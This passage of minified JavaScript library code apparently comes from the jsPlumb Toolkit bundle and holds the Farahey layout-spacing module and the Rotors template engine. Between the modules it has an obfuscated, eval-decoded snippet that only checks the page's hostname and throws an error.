24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.Farahey={};"undefined"!=typeof exports&&(exports.Farahey=n);var t=this.Biltong,e=function(n,t,e){var o=function(n,t,e){for(var o=0,i=n.length,r=-1,d=0;o<i;)if((d=e(n[r=parseInt((o+i)/2)],t))<0)o=r+1;else{if(!(d>0))return r;i=r}return o}(n,t,e);n.splice(o,0,t)},o=function(n,e){var o=n,i={},r=function(n){if(!i[n[1]]){var t=e(n[2]);i[n[1]]={l:n[0][0],t:n[0][1],w:t[0],h:t[1],center:[n[0][0]+t[0]/2,n[0][1]+t[1]/2]}}return i[n[1]]};this.setOrigin=function(n){o=n,i={}},this.compare=function(n,e){var i=t.lineLength(o,r(n).center),d=t.lineLength(o,r(e).center);return i<d?-1:i===d?0:1}},i=[function(n,t){return n.x+n.w-t.x},function(n,t){return n.x-(t.x+t.w)}],r=[function(n,t){return n.y+n.h-t.y},function(n,t){return n.y-(t.y+t.h)}],d=[null,[i[0],r[1]],[i[0],r[0]],[i[1],r[0]],[i[1],r[1]]],_=n.calculateSpacingAdjustment=function(n,e){var o=n.center||[n.x+n.w/2,n.y+n.h/2],i=e.center||[e.x+e.w/2,e.y+e.h/2],r=t.gradient(o,i),_=t.quadrant(o,i);return function(n,t,e,o,i){isNaN(e)&&(e=0);var r,_,s=t.y+t.h,a=e==1/0||e==-1/0?t.x+t.w/2:(s-o)/e,w=Math.atan(e);return function(n,t,e,o){return n[t]<=o&&o<=n[t]+n[e]}(t,"x","w",a)?{left:_=(r=d[i][1](n,t))/Math.sin(w)*Math.cos(w),top:r}:{left:_=d[i][0](n,t),top:r=_/Math.cos(w)*Math.sin(w)}}(n,e,r,r==1/0||r==-1/0||isNaN(r)?0:o[1]-r*o[0],_)},s=n.paddedRectangle=function(n,t,e){return{x:n[0]-e[0],y:n[1]-e[1],w:t[0]+2*e[0],h:t[1]+2*e[1]}},a=function(n,t,e,o,i,r,d,a,w,l,u,c,B){for(var h=s(r=r||[0,0],[1,1],o),j=0;j<n.length;j++)if(!c(n[j][1],n[j][2])){var p=t[n[j][1]],f=e[n[j][1]],g=s(p,f,o);if(d(n[j][1],n[j][2])){var m=_(h,g);p[0]+=m.left,p[1]+=m.top}}},w=function(n,e,o,i,r,d,a,w,l,u,c,B,h){d=d||[0,0],u=u||function(){},c=c||2;var j,p,f=s(d,[1,1],i),g=1,m=!0,v={},C=function(n,t,e,o){v[n]=!0,t[0]+=e,t[1]+=o};return function d(){for(var v=0;v<n.length;v++)if(!B(n[v][1],n[v][2])){var b=e[n[v][1]],y=n[v][1],D=(n[v][2],o[n[v][1]]),P=s(b,D,i);!h&&a(n[v][1],n[v][2])&&t.intersects(f,P)&&(j=_(f,P),p=r(n[v][1],b,j),C(y,b,p.left,p.top)),P=s(b,D,i);for(var E=0;E<n.length;E++)if(v!==E){if(B(n[E][1],n[E][2]))continue;if(a(n[E][1],n[E][2])){var x=e[n[E][1]],A=o[n[E][1]],S=s(x,A,i);t.intersects(P,S)&&(m=!0,j=_(P,S),p=r(n[E][1],x,j),C(n[E][1],x,p.left,p.top))}}}w&&u(),m&&g<c&&(m=!1,g++,w?window.setTimeout(d,l):d())}(),v},l=function(n){if(null==n)return null;if("[object Array]"===Object.prototype.toString.call(n)){var t=[];return t.push.apply(t,n),t}var e=[];for(var o in n)e.push(n[o]);return e},u=function(n){var t,i=n.getPosition,r=n.getSize,d=n.getId,_=n.setPosition,s=n.padding||[20,20],u=n.constrain||function(n,t,e){return e},c=[],B={},h={},j=l(n.elements||[]),p=n.origin||[0,0],f=n.executeNow,g=(this.getOrigin=function(){return p},n.filter||function(n){return!0}),m=n.exclude||function(n){return!1},v=n.orderByDistanceFromOrigin,C=new o(p,r),b=n.updateOnStep,y=n.stepInterval||350,D=n.debug,P=function(n){v&&0!==c.length?e(c,n,C.compare):c.push(n)},E=function(){return C.setOrigin(p),c.length=0,B={},h={},function(n){var t,e,o,_;t=e=1/0,o=_=-1/0;for(var s=0;s<n.length;s++){var a=i(n[s]),w=r(n[s]),l=d(n[s]);B[l]=[a.left,a.top],P([[a.left,a.top],l,n[s]]),h[l]=w,t=Math.min(t,a.left),e=Math.min(e,a.top),o=Math.max(o,a.left+w[0]),_=Math.max(_,a.top+w[1])}return[t,o,e,_]}(j)},x=function(n){if(j.length>1){var t=(n=n||{}).filter||g,e=n.padding||s,o=n.iterations,i=n.exclude||m,r=n.excludeFocus;n.gather&&a(c,B,h,e,0,p,t,0,0,0,0,i);var d=w(c,B,h,e,u,p,t,b,y,A,o,i,r);A(d)}},A=function(n){for(var t=0;t<j.length;t++){var e=d(j[t]);n[e]&&_(j[t],{left:B[e][0],top:B[e][1]})}},S=function(n){null!=n&&(p=n,C.setOrigin(n))};return this.execute=function(n,t){S(n),E(),x(t)},this.executeAtCenter=function(n){var t=E();S([(t[0]+t[1])/2,(t[2]+t[3])/2]),x(n)},this.executeAtEvent=function(e,o){var i=n.container,r=n.getContainerPosition(i),d=e.pageX-r.left+i.scrollLeft,_=e.pageY-r.top+i.scrollTop;D&&(t.style.left=e.pageX+"px",t.style.top=e.pageY+"px"),this.execute([d,_],o)},this.setElements=function(n){return j=l(n),this},this.addElement=function(n,t){return null==n||!t&&-1!==j.indexOf(n)||j.push(n),this},this.addElements=function(n,t){if(t)Array.prototype.push.apply(j,n);else for(var e=0;e<n.length;e++)this.addElement(n[e]);return this},this.getElements=function(){return j},this.removeElement=function(n){for(var t=-1,e=0;e<j.length;e++)if(j[e]===n){t=e;break}return-1!==t&&j.splice(t,1),this},this.setPadding=function(n){s=n},this.setConstrain=function(n){u=n},this.setFilter=function(n){g=n},this.reset=function(){j.length=0},D&&function(){var n=document.createElement("div");n.style.position="absolute",n.style.width="10px",n.style.height="10px",n.style.backgroundColor="red",document.body.appendChild(n),t=n}(),f&&this.execute(),this};n.getInstance=function(n){return new u(n)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t="undefined"!=typeof navigator&&/MSIE\s([\d.]+)/.test(navigator.userAgent)?new Number(RegExp.$1):-1,e=t>-1&&t<9,o=function(n,t,e){for(var o in t)n[o]=t[o],e&&e(o,n[o]);return n},i=function n(t,e,o){if(null==t)return null;if("$data"===e||null==e)return t;var i=e.match(/^\{(.*)\}$/);if(i){for(var r={},d=i[1].split(","),_=0;_<d.length;_++){var s=d[_].split(":"),w=n(t,s[1]);r[a(s[0])]=w||s[1].replace(/'/g,"")}return r}var l=t,u=null;return(e=e.replace(/\['([^']*)'\]/g,".$1")).replace(/([^\.])+/g,function(n,t,e,i){if(null==u){var r=n.match(/([^\[0-9]+){1}(\[)([0-9+])/),d=function(){return l[r[1]]||(l[r[1]]=[],l[r[1]])};if(e+n.length>=i.length)if(r){var _=d(),s=r[3];null==o?u=_[s]:_[s]=o}else null==o?u=l[n]:l[n]=o;else if(r){var a=d();l=a[r[3]]||(a[r[3]]={},a[r[3]])}else l=l[n]||(l[n]={},l[n])}}),u},r=function(t){var e=n.document.getElementById(t);return null!=e?e.innerHTML:null},d=function(n){return"[object Array]"===Object.prototype.toString.call(n)},_=function n(t){for(var e=[],o=0;o<t.length;o++)d(t[o])?e.push.apply(e,n(t[o])):e[e.length]=t[o];return e},s=function(n,t){for(var e=[],o=0,i=n.length;o<i;o++)t(n[o])&&e.push(n[o]);return e},a=function(n){if(null==n)return n;for(var t=n.replace(/^\s\s*/,""),e=/\s/,o=t.length;e.test(t.charAt(--o)););return t.slice(0,o+1)},w=function(n,t,e,o,i){var r=u(),d={w:t,e:[],u:r};i.bindings[r]=d;return d.reapply=new Function("$data",(null!=o?"var out='';try { with($data) { if ("+o+") out = this.w; else return null; }}catch(_){return null;}":"var out = this.w;")+"for (var k = 0; k < this.e.length; k++) { with($data) { "+(null!=o?"try {  if("+o+") { out = out.replace(this.e[k][0], eval(this.e[k][1])); } else out=''; } catch(__) { out='';}":"try { out = out.replace(this.e[k][0], eval(this.e[k][1])); } catch(__) { out=out.replace(this.e[k][0], '');}")+" }} return out;"),e.bindings[n]=d,t.replace(/\$\{([^\}]*)\}/g,function(n,t,e,o){d.e.push([n,t])}),r},l=function(n,t,e,o,i){e.atts[n]=t,w(n,t,e,o,i)},u=function(n){return(n?"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx":"xxxxxxxx-xxxx-4xxx").replace(/[xy]/g,function(n){var t=16*Math.random()|0;return("x"==n?t:3&t|8).toString(16)})},c=function(n,t){this.uuid=u(),this.children=[],this.instance=t,t.entries[this.uuid]=this},B=function(n,t){c.apply(this,arguments);var e=function(n,t){function e(n,e){var o=n.match(/([^=]+)=['"](.*)['"]/);return null==o&&null==e?i.atts[n]="":null==o?l(n,"",i,e,t):l(o[1],o[2],i,e,t),o}for(var o=t.parseAttributes(n),i={el:a(o[0]),atts:{},bindings:{}},r=1;r<o.length;r++){var d=a(o[r]);if(null!=d&&d.length>0){var _=d.match(t.inlineIfRe);if(_)for(var s=_[2].split(t.attributesRe),w=0;w<s.length;w++){var u=a(s[w]);null!=u&&u.length>0&&e(u,_[1])}else e(d)}}return i}(n,t);null!=e.atts["r-toggle"]&&null!=t.toggleManager&&(this.discard=!1===t.toggleManager(e.atts["r-toggle"]));var o=e.el.split(":");this.tag=e.el,2===o.length&&(this.namespace=o[0]),this.atts=e.atts,this.bindings=e.bindings,this.type="element",this.compile=function(n,t){var e=n.customTags[this.tag]||n.globalTags[this.tag];if(e){for(var o=e.getFunctionBody(this),i=n.customTags[this.tag]?"_rotors.customTags['"+this.tag+"'].rendered(_le, _rotors, data[0]);":"_rotors.globalTags['"+this.tag+"'].rendered(_le, _rotors, data[0]);",r=0;r<this.children.length;r++)this.children[r].precompile&&(o+=this.children[r].precompile(n)),o+=this.children[r].compile(n),this.children[r].postcompile&&(o+=this.children[r].postcompile(n));return o+"_le=_els.pop();"+i+"_rotors.pet(_eid,'"+this.uuid+"');"}var d="/* element entry "+this.uuid+" */;";if(!0!==this.remove)for(var _ in d+=n.getExecutionContent(this.tag,this.uuid,!1,this.namespace),this.atts){if(this.atts.hasOwnProperty(_))d+="__a="+(null!=this.bindings[_]?"_rotors.bind(data[0], '"+this.bindings[_].u+"');":"'"+this.atts[_]+"'")+";if(__a!=null) {_rotors.setAttribute(e,'"+_+"',__a || '');}"}for(var s=0;s<this.children.length;s++)this.children[s].precompile&&(d+=this.children[s].precompile(n)),d+=this.children[s].compile(n),this.children[s].postcompile&&(d+=this.children[s].postcompile(n));return!0===this.remove||t||(d+="_le=_els.pop();",d+="_rotors.pet(_eid, '"+this.uuid+"');"),d};var i=function(n,e){t.each(e.split(";"),function(t){var e=t.indexOf(":"),o=t.substring(0,e);n.style[o]=t.substring(e+1)})};this.update=function(n,e){for(var o in this.atts){var r;if(this.atts.hasOwnProperty(o)&&"class"!==o)null!=(r=null!=this.bindings[o]?this.bindings[o].reapply(e):"'"+this.atts[o]+"'")&&("style"===o&&null!=n.style?i(n,r):n.setAttribute(o,r))}if(this.originalCustomTag){var d=t.customTags[this.originalCustomTag]||t.globalTags[this.originalCustomTag];d&&d.updated(n,e)}}},h=function(n){this.uuid=u(),this.comment=n,this.compile=function(){return""}},j=function(){this.childNodes=[],this.appendChild=function(n){this.childNodes.push(n)},this.toString=function(){for(var n="",t=0;t<this.childNodes.length;t++)n+=this.childNodes[t].toString();return n}},p=function(n,t,e){return function(o){var i=e?null:n.cache[o];return null==i&&(i=t(o)),null==i&&(i=n.defaultTemplate),null!=i&&(n.cache[o]=i),i}},f=function(n){n=n||{},this.cache={},this.templateCache={},this.customTags={},null!=n.defaultTemplate&&this.setDefaultTemplate(n.defaultTemplate),this.templateResolver=n.templateResolver?n.templateResolver:n.templates?function(t){return n.templates[t]}:function(n){return n.isBrowser?r:null}(this),this.toggleManager=null};!function(n,t){for(var e in t)t.hasOwnProperty(e)&&(n[e]=t[e])}(f.prototype,{bindings:{},entries:{},executions:{},bind:function(n,t){var e=this.bindings[t];return null==e?"":e.reapply(n)},defaultTemplate:"<div></div>",defaultCompiledTemplate:null,setDefaultTemplate:function(n){null!=n?(this.defaultTemplate=n,this.defaultCompiledTemplate=this.compile(this.parse(n))):this.clearDefaultTemplate()},clearDefaultTemplate:function(){this.defaultTemplate=null,this.defaultCompiledTemplate=null},clearCache:function(){this.cache={},this.templateCache={}},namespaceHandlers:{svg:function(n){return"e = document.createElementNS('http://www.w3.org/2000/svg', '"+n.split(":")[1]+"');e.setAttribute('version', '1.1');e.setAttribute('xmlns', 'http://www.w3.org/1999/xhtml');"}},namespaces:{xlink:"http://www.w3.org/1999/xlink"},each:function(n,t,e,o){var i;if(d(n))for(i=0;i<n.length;i++)t(n[i],e,i,o);else for(i in n)n.hasOwnProperty(i)&&t({$key:i,$value:n[i]},e,i,o)},openRe:new RegExp("<([^/>]*?)>$|<([^/].*[^/])>$"),closeRe:new RegExp("^</([^>]+)>"),openCloseRe:new RegExp("<(.*)(/>$)"),tokenizerRe:/(<[^\^>]+\/>)|(<!--[\s\S]*?-->)|(<[\/a-zA-Z0-9\-:]+(?:\s*[a-zA-Z\-]+=\"[^\"]*\"|\s*[a-zA-Z\-]+='[^']+'|\s*[a-zA-Z\-]|\s*\{\{.*\}\})*>)/,commentRe:/<!--[\s\S]*?-->/,attributesRe:/([a-zA-Z0-9\-_:]+="[^"]*")|(\{\{if [^(?:\}\})]+\}\}.*\{\{\/if\}\})/,inlineIfRe:/\{\{if ([^\}]+)\}\}(.*)\{\{\/if\}\}/,singleExpressionRe:/^[\s]*\$\{([^\}]*)\}[\s]*$/,parseAttributes:function(n){return null==n?n:this.filterEmpty(n.replace("/>",">").split(/^<|>$/)[1].split(this.attributesRe))},map:function(n,t){for(var e=[],o=0,i=n.length;o<i;o++)e.push(t(n[o]));return _(e)},flatten:_,filter:s,data:i,uuid:u,filterEmpty:function(n){return s(n,function(n){return null!=n&&a(n).length>0})},isBrowser:"undefined"!=typeof navigator,isOldIE:function(){return e},cf:function(){return this.isBrowser?this.isOldIE()?n.document.createElement("div"):n.document.createDocumentFragment():new j},ctn:function(t){return this.isBrowser?n.document.createTextNode(t):new function(n){this.nodeValue=n,this.toString=function(){return this.nodeValue}}(t)},ce:function(t){return this.isBrowser?n.document.createElement(t):new function(n){j.apply(this),this.tag=n;var t={};this.setAttribute=function(n,e){t[n]=e},this.getAttribute=function(n){return t[n]},this.setAttributeNS=function(n,e,o){t[n+":"+e]=o},this.toString=function(){var n="<"+this.tag,e="";for(var o in t)e+=" "+o+'="'+t[o]+'"';n=n+e+">";for(var i=0;i<this.childNodes.length;i++)n+=this.childNodes[i].toString();return n+"</"+this.tag+">"}}(t)},customElements:{"r-each":{parse:function(n,t,e,o){n.context=n.atts.in,n.type="each"},compile:function(n){var t=function(){var t="function(item, _rotorsLoopId, _rotorsLoopIndex, _rotorsLoopContext) { ";t+="data.unshift(item);$value=item;$key=_rotorsLoopIndex;";for(var e=0;e<this.children.length;e++)t+=this.children[e].compile(n);return(t+="data.splice(0,1);")+"}"}.bind(this);return";_rotors.te(null, _eid, '"+this.uuid+"');"+(this.context?';data.unshift(_rotors.data(data[0], "'+this.context+'"));':"")+"_rotors.each(data[0], "+t()+",'"+this.uuid+"', '"+this.context.replace(/'/g,"\\'")+"');"+(this.context?";data.splice(0, 1);":"")+";_rotors.pet(_eid, '"+this.uuid+"');"}},"r-if":{parse:function(n,t,e,o){n.test=n.atts.test},compile:function(n){var t,e="",o="",i=this.happyFlowChildren||this.children;for(t=0;t<i.length;t++)e+=i[t].compile(n)+";";if(null!=this.happyFlowChildren){for(o="else {",t=0;t<this.children.length;t++)o+=this.children[t].compile(n)+";";o+="}"}return";with (data[0]) { if("+this.test+") { "+e+" }"+o+"}"}},"r-else":{remove:!0,parse:function(n,t,e,o,i){var r=g.peek(i);null!=r&&"r-if"===r.tag&&(r.happyFlowChildren=r.children,r.children=[])},compile:function(n){}},"r-for":{parse:function(n,t,e,o,i){n.loop=n.atts.loop},compile:function(n){var t="";t+="var __limit; with(data[0]){__limit=("+this.loop+");}",t+="for(var $index=0;$index<__limit;$index++){data[0].$index=$index;";for(var e=0;e<this.children.length;e++)t+=this.children[e].compile(n)+";";return t+"}delete data[0].$index;"}},"r-tmpl":{remove:!0,parse:function(n,t,e,o,i,r){if(n.type="template",n.context=n.atts.context,n.atts.lookup)n.lookup=n.atts.lookup,n.default=n.atts.default||"",n.compile=function(t){return';with(data[0]){var tlid=eval("'+n.lookup.replace(/[\$\{\}]/g,"")+'");}if (_rotors.templateCache[tlid] == null){var ___t = _rotors.templateResolver(tlid) || _rotors.templateResolver("'+n.default+'");_rotors.templateCache[tlid]=_rotors.compile(_rotors.parse(___t));} eval(_rotors.templateCache[tlid].functionBody);'};else{n.templateId=n.atts.id;var d=function(n){if(null==n||0===n.length)return!1;for(var t=n.length-1;t>-1;t--)if("each"===n[t].type)return!0;return!1}(i);if(-1!==r.indexOf(n.templateId)){if(!d)throw new TypeError("recursive template call ["+n.templateId+"]");n.compile=function(t){return";eval(_rotors.templateCache['"+n.templateId+"'].functionBody);"}}else{var _=e(n.templateId);r.push(n.templateId);var s=o.parse(_,e,null,r);null==o.templateCache[n.templateId]&&(o.templateCache[n.templateId]=o.compile(s));for(var a=0;a<s.length;a++)s[a].context=n.context;o.debug("nested ast",s),n.children=s,r.pop()}}},precompile:function(n){return this.context?';data.unshift(_rotors.data(data[0], "'+this.context+'"));':""},postcompile:function(n){return this.context?";data.splice(0, 1);":""}},"r-html":{parse:function(n,t,e,o){},compile:function(n){try{return";var __hp=_rotors.parse(data[0]."+this.children[0].bindings.__element.e[0][1]+"),__hc=_rotors.compile(__hp,true);var __f=__hc(data[0], _rotors);Rotors.peek(_els).appendChild(__f.childNodes[0]);"}catch(t){return n.maybeDebug("Could not find key to bind for r-html element. Should be in the form <r-html>${key}</r-html> ('key' can be anything)"),""}}}},globalTags:{},registerTag:function(n,t,e){this[e?"globalTags":"customTags"][n]=new function(n,t,e){var i=function(t,e){for(var i=[],r=0;r<t.length;r++){var d=o({},t[r]);i.push(d),o(d.atts,e.atts,function(t,e){l(t,e,d,null,n)})}return i}.bind(this);this.template=e.template,this.getFunctionBody=function(t){return n.compile(i(n.parse(e.template,null,{originalCustomTag:t.tag,context:t.context}),t),!1,!0,!0)}.bind(this),this.getFunctionEnd=function(){return";_els.pop();"},this.rendered=e.rendered||function(){},this.updated=e.updated||function(){}}(this,n,t)},setAttribute:function(n,t,e){var o=t.split(":");1===o.length||null==this.namespaces[o[0]]?n.setAttribute(o[0],e):n.setAttributeNS(this.namespaces[o[0]],o[1],e)},setToggleManager:function(n){this.toggleManager=n},debugEnabled:!1,debug:function(){this.debugEnabled&&console.log.apply(console,arguments)},maybeDebug:function(){this.debugEnabled&&arguments[0]&&console.log.apply(console,arguments)},parse:function(n,t,e,o){o=o||[],t=p(this,t||this.templateResolver,null);var i=[],r=[],d=this,_=function(n,t){var e=n.match(t);return null!=e&&e},s=function(){return i.length>0?i[i.length-1]:null},l=function(n,t){i.length>0&&s().children.push(n),t?0==i.length&&r.push(n):i.push(n)},u=function(){var n=i.pop();if(0!==i.length||n.discard){if(n.discard){var t=g.peek(i);t&&t.children.pop()}}else r.push(n);return n},j=function(n,t,e,o,r){var d=new B(n,o),_=o.customElements[d.tag];return _&&(_.parse(d,t,e,o,i,r),_.compile&&(d.compile=_.compile),d.precompile=_.precompile,d.postcompile=_.postcompile,d.custom=!0,d.remove=_.remove,o.debug("  element is a custom element"),o.maybeDebug(d.remove,"  element's root should not appear in output")),d},f=[{re:d.commentRe,handler:function(n,t,e,o){o.debug("comment",n,t),l(new h(n),!0)}},{re:d.openRe,handler:function(n,t,e,o,i){o.debug("open element",n,t);var r=j(n,t,e,o,i);l(r,r.remove)}},{re:d.closeRe,handler:function(n,t,e,o){o.debug("close element",n,t);var i=o.customElements[t[1]];if(null==i||!i.remove){if(!function(n){var t=s();return null!=t&&t.tag==n}(t[1]))throw new TypeError("Unbalanced closing tag '"+t[1]+"'; opening tag was '"+u().tag+"'");u()}}},{re:d.openCloseRe,handler:function(n,t,e,o,i){o.debug("open and close element",n,t);var r=j(n,t,e,o,i);l(r,!0)}},{re:/.*/,handler:function(n,t,e,o){o.debug("text node",n);var i=new function(n,t){c.apply(this,arguments),this.value=n.value,this.type="text",this.bindings={};var e=function(){return"_rotors.bind(data[0], '"+this.bindings.__element.u+"', typeof $key !== 'undefined' ? $key : null, typeof $value !== 'undefined' ? $value : null)"}.bind(this);this.compile=function(n){return n.getExecutionContent(e(),this.uuid,!0)+";_rotors.pet(_eid, '"+this.uuid+"');"},this.update=function(n,t){n.nodeValue=this.bindings.__element.reapply(t)}}({value:n},o);(function(n){l(n,!0)})(i),w("__element",n,i,null,o)}}];if(function(n,t){for(var e=0;e<n.length;e++){var o=n[e];null!=o&&0!==o.length&&t(e,o)}}(a(n).split(this.tokenizerRe),function(n,e){for(var i=a(e),r=0;r<f.length;r++){var d=_(i,f[r].re);if(d){f[r].handler(e,d,t,this,o);break}}}.bind(this)),r.length>0&&e)for(var m in e)r[0][m]=e[m];return r},compile:function(n,t,e,o){for(var i=[],r=0;r<n.length;r++){var d="";n[r].precompile&&(d+=n[r].precompile(this)),d+=n[r].compile(this,o),n[r].postcompile&&(d+=n[r].postcompile(this)),i.push(d)}var _=i.join("");if(this.debug("function body :",_),e)return _;var s=new Function("data,_rotors","data=[data||{}];var frag=_rotors.cf(),_els=[],e,_le,__a,$value,$key,_eid = _rotors.nec();_els.push(frag);"+_+"return frag;"),a=this;if(t)return s;var w=function(n){return s.apply(this,[n,a])};return w.functionBody=_,w},nec:function(){var n=this.uuid();return this.executions[n]={current:[{children:[]}]},n},te:function(n,t,e,o){var i={el:n,children:[],id:e,index:o};this.executions[t].current[0].children.push(i);var r=e+(null!=o?"-"+o:"");this.executions[t][r]=i,this.executions[t].current.unshift(i)},pet:function(n,t){this.executions[n].current=this.executions[n].current.splice(1)},getExecutionContent:function(n,t,e,o,i){return(null!=o?this.namespaceHandlers[o](n):e?"e=_rotors.ctn("+n+");":"e=_rotors.ce('"+n+"');")+"Rotors.peek(_els).appendChild(e);"+(e?"":"_els.push(e);")+"e._rotors=_rotors.entries['"+t+"'];e._rotorsEid=_eid;if(typeof _rotorsLoopId !== 'undefined') {e._rotorsLoopId=_rotorsLoopId;e._rotorsLoopIndex=_rotorsLoopIndex;e._rotorsLoopContext=_rotorsLoopContext;}_rotors.te(e, _eid, '"+t+"', typeof _rotorsLoopIndex != 'undefined' ? _rotorsLoopIndex : null);"},updaters:{},onUpdate:function(n,t){if(null!=n._rotors){var e=n._rotors.instance;n._RotorsUpdate=n._RotorsUpdate||u(),e.updaters[n._RotorsUpdate]=e.updaters[n._RotorsUpdate]||[],e.updaters[n._RotorsUpdate].push(t)}},update:function(n,t){var e,o,i=[],r=n._rotorsEid;if(null!=r&&null!=n._rotors){e=(o=n._rotors.instance).executions[r];var d=n._rotorsLoopIndex;!function n(t,e,r){null!=t&&(t._rotors.update(t,e),t._RotorsUpdate&&o.updaters[t._RotorsUpdate]&&i.push([t,o.updaters[t._RotorsUpdate],e]));for(var d=0;d<r.children.length;d++){var _=o.entries[r.children[d].id],s="each"===o.entries[r.id].type&&null!=r.children[d].el&&null!=r.children[d].el._rotorsLoopIndex?e[r.children[d].el._rotorsLoopIndex]:o.data(e,_.context);n(r.children[d].el,s,r.children[d])}}(n,t,e[n._rotors.uuid+(null!=d?"-"+d:"")]);for(var 